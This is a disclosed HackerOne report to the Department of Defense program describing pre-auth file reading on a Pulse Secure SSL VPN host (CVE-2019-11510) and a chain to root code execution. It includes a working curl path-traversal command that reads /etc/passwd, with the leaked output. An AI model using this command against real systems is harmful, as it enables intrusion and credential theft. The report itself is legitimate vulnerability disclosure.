# Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://██████ (███)

## Report Details
- **Report ID**: 696276
- **URL**: https://hackerone.com/reports/696276
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-09-17T07:31:51.824Z
- **Disclosed**: 2024-06-18T17:07:45.926Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking

Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

I discovered that `https://██████████` instance is vulnerable to described vulnerabilities.

##POC

Reading `/etc/passwd` via CVE-2019-11510:
```
curl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```
```
root:x:0:0:root:/:/bin/bash
nfast:x:0:0:nfast:/:/bin/bash
bin:x:1:1:bin:/:
nobody:x:99:99:Nobody:/:
dns:x:98:98:DNS:/:
term:x:97:97:Telnet/SSH:/:
web80:x:96:96:Port 80 web:/:
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
```
█████

The RCE can be achieved with this chain:
1) Pulse Secure stores credentials in the cleartext.
2) Attacker reads credentials  and authorizes on VPN
3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.

##Suggested fix
Update the Pulse Secure SSL VPN software.

##Note
If you experience timeout errors when reproducing, try to change your IP/VPN

## Impact

Remote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.
You can see here example report to Twitter by Orange Tsai: https://hackerone.com/reports/591295

## Attachments
No attachments
